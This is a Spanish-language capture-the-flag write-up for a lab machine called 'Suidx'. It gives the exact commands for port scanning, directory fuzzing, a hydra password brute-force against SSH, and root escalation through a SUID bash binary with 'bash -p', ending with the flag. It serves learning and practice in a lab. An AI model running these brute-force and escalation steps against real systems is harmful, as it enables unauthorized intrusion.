# 🔐 CTF: Análisis de Seguridad - Máquina "Suidx"
Estudiante: Dante
Fecha: 10 de diciembre de 2025
Plataforma: Whoami Labs
IP Objetivo: 172.17.0.2
Temas	Enumeración web, Fuerza bruta SSH, Escalada SUID

# Resumen Ejecutivo
Máquina Linux que requiere enumeración meticulosa de servicios web para descubrir pistas de
credenciales, seguida de ataque de fuerza bruta contra SSH y explotación de binario SUID (Bash) 
para escalada de privilegios hasta obtener acceso root.

# Fase 1: Reconocimiento
Escaneo de Puertos
nmap -sV -sC 172.17.0.2
Resultados:

PORT     STATE SERVICE          VERSION
21/tcp   open  ftp?
22/tcp   open  ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
25/tcp   open  smtp?
3306/tcp open  mysql?
5432/tcp open  postgresql?
8080/tcp open  http             Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: SuidX Lab | whoami-labs
8081/tcp open  blackice-icecap?
Análisis: Servicio web en puerto 8080 y SSH en puerto 22 como vectores principales.

# Fase 2: Enumeración Web
## Inspección Manual
Acceso a http://172.17.0.2:8080 sin contenido relevante. Código fuente sin información útil.

## Fuzzing de Directorios

## dirsearch -u http://172.17.0.2:8080 -e php,asp,aspx,txt,html

## Hallazgo clave:
[02:20:08] 301 - 314B - /user -> http://172.17.0.2:8080/user
Descubrimiento de Pista
Accediendo a /user:

User Information
SSH Username: hacker
Password: Use common wordlist attacks
Interpretación: Credencial SSH parcial expuesta, invitando a fuerza bruta.

# Fase 3: Explotación - Fuerza Bruta SSH
## Ataque Dirigido con Hydra
hydra -l hacker -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -f
Parámetros:

-l hacker: Usuario de la pista web

-P rockyou.txt: Diccionario de contraseñas

-t 4: 4 hilos para evitar bloqueo

-f: Finalizar al encontrar credencial

## Resultado:

[22][ssh] host: 172.17.0.2   login: hacker   password: amorcito

Acceso Inicial

ssh hacker@172.17.0.2# Contraseña: amorcito

# Fase 4: Escalada de Privilegios
## Enumeración de Binarios SUID

find / -perm -4000 -type f 2>/dev/null

Hallazgo:

/usr/bin/bash

Explotación de Bash SUID

/usr/bin/bash -p
El parámetro -p mantiene privilegios del propietario (root)
Confirmación:

whoami
## root

# Fase 5: Post-Explotación
Obtención de Flag
cd /root
ls -la
cat flag.txt

# Flag:

## 1EEME_n0w



# Lecciones Aprendidas

Enumeración Web Metódica: Fuzzing descubrió ruta crítica /user

Fuerza Bruta Inteligente: Pistas redujeron espacio de búsqueda

Análisis de Binarios SUID: Identificación rápida de vectores

Explotación Configuraciones: Bash SUID mal configurado

## Mejores Prácticas:
Siempre enumerar binarios SUID tras acceso inicial

Combinar pistas de diferentes fuentes

Usar diccionarios según contexto

## Conclusión
Suidx demostró la importancia de enumeración exhaustiva y correlación de información entre diferentes vectores,
desde reconocimiento hasta escalada de privilegios.
